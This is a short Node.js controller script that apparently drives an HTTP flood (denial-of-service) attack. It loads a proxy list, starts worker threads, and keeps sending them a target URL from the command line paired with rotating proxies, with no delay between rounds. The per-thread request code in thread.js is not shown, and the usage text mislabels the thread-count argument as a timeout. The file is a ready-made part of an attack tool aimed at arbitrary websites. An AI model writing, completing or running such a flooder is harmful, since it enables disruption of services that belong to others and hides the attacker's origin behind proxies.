const { Worker } = require('worker_threads');
const fs = require('fs')

const proxies = fs.readFileSync('./proxies.txt', 'utf-8').split(/\r|\n/g).filter(a=>a)
function load(url, threads) {
    const workers = Array(threads).fill().map(() => new Worker("./thread.js"))
    var i = -1
    setInterval(() => {
        workers.forEach(worker => {
            worker.postMessage(`${url}<>${proxies[i = (i+1)%proxies.length]}`)
        })
    })
}

const url = process.argv[2]
const threads = Number(process.argv[3])

if (
    !url || 
    !url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)/) || 
    !threads
) return console.log("Usage: node master.js <URL> <TIMEOUT?> (? = optional)")
load(url, threads)